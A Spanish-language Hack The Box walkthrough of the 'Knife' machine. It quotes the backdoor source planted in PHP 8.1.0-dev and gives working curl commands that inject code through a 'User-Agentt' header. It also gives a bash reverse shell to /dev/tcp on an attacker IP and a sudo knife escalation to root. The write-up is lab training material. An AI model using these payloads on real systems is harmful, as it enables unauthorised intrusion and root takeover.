#by d4l1

<h1 align="center">KNIFE</h1>

<p align="center"><img src="https://github.com/D4l1-web/HTB/assets/79869523/85d7a8e8-60c2-4ce6-a4c2-d3d03dab76f3"></p>

# INTRODUCCIÓN

Knife es una máquina Linux con dificultar fácil, deberemos hacer un backdoor por php. Esta vulnerabilidad nos dara poder entrar al servidor. Una missconfiguracion de sudo para ganar root.

Como siempre el ping y el escaneo de puertos

![image](https://github.com/D4l1-web/HTB/assets/79869523/7ae003f4-bf6e-456e-b15f-69679e178704)

Escaner

![image](https://github.com/D4l1-web/HTB/assets/79869523/b3ac5b6c-f73a-4cef-99b2-6f387d923a66)

Nos revela dos puertos el 22 (ssh) y el 80 (http) un apache

Utilizaremos fuzz para enumerar archivos 

```
ffuf -u http://10.10.10.242/FUZZ -w /usr/share/wordlists/dirb/common.txt
```
![image](https://github.com/D4l1-web/HTB/assets/79869523/8642d191-9625-49be-87e0-8e51fa56612b)

nada interesante menos un index.php vamos a ver si responde

```
curl -I http://10.10.10.242/index.php
```

![image](https://github.com/D4l1-web/HTB/assets/79869523/ae0ce0fe-584e-40f8-b5b2-8137c043689a)


Nos revela que "X-Powered-by" en php/8.1.0-dev y encontramos un [exploit](https://www.exploit-db.com/exploits/49933)

La version PHP tal es de 28th de 2021, tiene contenido malicio pusheando "php-src-repo" pero el backdoor se decubrio y se removio, pero tiene un commit explicando la funcion.

```

 zval zoh;
 php_output_handler *h;
 zval *enc;
 if ((Z_TYPE(PG(http_globals)[TRACK_VARS_SERVER]) == IS_ARRAY ||
zend_is_auto_global_str(ZEND_STRL("_SERVER"))) &&
 (enc = zend_hash_str_find(Z_ARRVAL(PG(http_globals)[TRACK_VARS_SERVER]),
"HTTP_USER_AGENTT", sizeof("HTTP_USER_AGENTT") - 1))) {
 convert_to_string(enc);
 if (strstr(Z_STRVAL_P(enc), "zerodium")) {
 zend_try {
 zend_eval_string(Z_STRVAL_P(enc)+8, NULL, "REMOVETHIS: sold to zerodium, mid
2017");
 } zend_end_try();
 }
 }
 switch (ZLIBG(output_compression)) {
 case 0:
```

El codigo checkear que la string "zerodium" en User_agent header, busca un ejecutar el codigo despues del string
```
zend_eval_string(Z_STRVAL_P(enc)+8, NULL, "REMOVETHIS: sold to zerodium, mid 2017");
```
Vamos a coger un listener en el puerto 80 o el que quieras

Haremos un curl a dicha direccion

```
curl http://10.10.10.242/index.php -H 'User-Agentt: zerodiumsystem("curl 10.10.14.177");'
sudo python3 -m http.server 80
```
Yo en mi caso he abierto en el puerto 8000 pero no hay ningun problema simplemente poneis :  y el puerto
![image](https://github.com/D4l1-web/HTB/assets/79869523/ceff49dc-9af3-4f3f-9e8a-42a26e90134f)

Tenemos conexión probemos ahora una rvshell

```
curl http://10.10.10.242/index.php -H "User-Agentt: zerodiumsystem(\"bash -c 'bash -i
&>/dev/tcp/10.10.14.177/1234 0>&1 '\");"
```

Estamo dentro 

![image](https://github.com/D4l1-web/HTB/assets/79869523/6d4a3570-1df4-4477-93a0-0384d82eed11)

Tenemos la primera flag 
![image](https://github.com/D4l1-web/HTB/assets/79869523/d3550329-8ae1-49a3-b264-6970e040f6bb)

## ESCALADA DE PRIVILEGIOS

Una vez hecho esto utilizamos el mágico linpeash curleamos nuestra ip y nos lo bajamos

![image](https://github.com/D4l1-web/HTB/assets/79869523/af244d50-e419-487d-9703-1eb3fffce078)

Nos dice que james puede ejecutar knife como root. knife es una herramienta con interfaz que mantiene los nodos automatizados, libros de cocina, recipientes, etc. 

```
sudo knife data bag create 1 2 -e vi
```
Esto nos abrira un vim edito y creamos una shell con root

```
:!/bin/sh
```
No podemos hacerlo y debemos upgradear la shell

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
ctrl+z
stty raw -echo
fg
reset
xterm
```
```
sudo knife exec
exec "/bin/bash"
```
pulsamos Ctrl + d 

Somos root

![image](https://github.com/D4l1-web/HTB/assets/79869523/859ae349-3814-455f-b6be-d3210f4161e0)


